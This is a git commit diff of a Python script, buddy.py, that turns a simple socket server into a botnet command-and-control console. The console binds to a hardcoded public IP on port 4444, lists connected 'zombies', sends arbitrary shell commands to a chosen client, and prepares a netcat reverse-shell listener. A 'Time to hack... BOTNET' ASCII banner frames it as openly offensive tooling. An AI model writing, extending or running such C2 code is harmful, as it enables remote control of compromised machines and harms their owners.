09cec6ca37ecb3daaada5446fda209637c6cc95c
Xprogrammer777 <76904094+Xprogrammer777@users.noreply.github.com>
2023-05-26 21:30:20 +0400

    Update buddy.py

--- buddy.py
+++ buddy.py
@@ -1,53 +1,103 @@
 import socket
 import select
 import threading
+import os
 
+mikuhacking = '''
+         /^>》, -―‐‐＜＾}》
+　　　 　/:≠´:::::;::::ヽ.
+　　　 /::〃:::::／}:丿ハ    < Time to hack... >
+　　　/:: i  ::／　ﾉ／ }:}
+　　/:::: 瓜 イ ＞´ ＜ ,'ﾉ
+　/:::::|ﾉﾍ.{､　 ヮ_.ノﾉイ
+|::::::|  ／,}｀ｽ  /￣￣￣￣/
+|::::::|  (_::::つ/ BOTNET/
+     ￣￣￣￣￣＼/________/
+                
+'''
+banner = f'''''
+{mikuhacking}
+ok
+'''''
+print(banner)
+
+
+
+print("[*] Initializing....")
 # Create a TCP/IP socket
 server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # Bind the socket to a specific address and port
-
-HOST = '161.35.34.149'
-PORT = 4444
-
-server_address = (HOST, PORT)
+server_address = ('161.35.34.149', 4444)
 server_socket.bind(server_address)
 
 # Listen for incoming connections
 server_socket.listen()
 
-print(f"Listening for incoming connections on port {server_address[1]}...")
+print(f"[*] Searching for botnets on {server_address[0]} port {server_address[1]}...")
 
 # List of connected clients
 connected_clients = []
 
-def list_clients():
-    print("\nList of connected clients:")
+def help():
+    print('''
+    == HELP ==
+
+    | list : View actual online zombies
+    | connect : Select one or multiple host to send a command using a shell
+    | sgfile : Select a host to get or send a file (TCP)
+    | reverse : open ncat reverse shell listener once reverse command have been send to a client
+    ''')
+
+def list():
+    print("\n == ONLINE BOTNETS ==\n")
     for i, client_socket in enumerate(connected_clients):
         client_address = client_socket.getpeername()
+        global client_list 
+        client_list= f"{i}: {client_address[0]}:{client_address[1]}"
         print(f"{i}: {client_address[0]}:{client_address[1]}")
 
-def send_message():
+def connect():
     if connected_clients:
         try:
-            client_numbers = input("\nEnter client number(s) to send message to (comma-separated): ")
-            client_numbers = [int(num) for num in client_numbers.split(",")]
-            message = input("Enter the message to send: ")
+            print("\n == CONNECT == \n")
+            print(client_list)
 
-            for client_number in client_numbers:
-                client_socket = connected_clients[client_number]
-                client_socket.send(message.encode())
+            client_number = int(input("\n Set client number : "))
+            client_socket = connected_clients[client_number]
+            command = input("--(command) > ")
+            client_socket.send(command.encode())
+            #if command != "reverse":
+            #    client_socket.send(f"#LHA#{command}".encode()) # #LHA# is used to cut so that the client know what to exec and what it shouldn't
+           # elif command == "reverse":
+            #    client_socket.send("reverse".encode())
+            
+            
+            #client_socket.send(command.encode())
+            print("[*] Command send!")
         except (ValueError, IndexError):
             # Ignore any input errors and continue listening for connections
             pass
 
 def terminalx():
     while True:
-        terminal = str(input("server -->")).lower()
+        terminal = str(input("server --> ")).lower()
         if terminal == "list":
-            list_clients()
-        if terminal == "send":
-            send_message()
+            list()
+        if terminal == "connect":
+            connect()
+        if terminal == "help":
+            help()
+        if terminal == "clear":
+            os.system("clear")
+            os.system("cls")
+        if terminal == "banner":
+            print(banner)
+        if terminal == "reverse":
+            print("[!] Client ready open a new terminal and run netcat!")
+
+            #os.system("ncat -lvp 4448")
+        
 
 input_thread = threading.Thread(target=terminalx)
 input_thread.daemon = True
@@ -62,8 +112,7 @@ while True:
         if socket_ready is server_socket:
             # Accept the connection
             client_socket, client_address = server_socket.accept()
-            print(f"New connection from {client_address[0]}:{client_address[1]}")
-
+            print(f"\n [INFO] NEW BOTNET : {client_address[0]}:{client_address[1]} \n")
 
             # Add the client to the list of connected clients
             connected_clients.append(client_socket)
@@ -73,3 +122,4 @@ while True:
             message = socket_ready.recv(1024).decode()
             client_address = socket_ready.getpeername()
             print(f"Received message from {client_address[0]}:{client_address[1]} - {message}")
+            
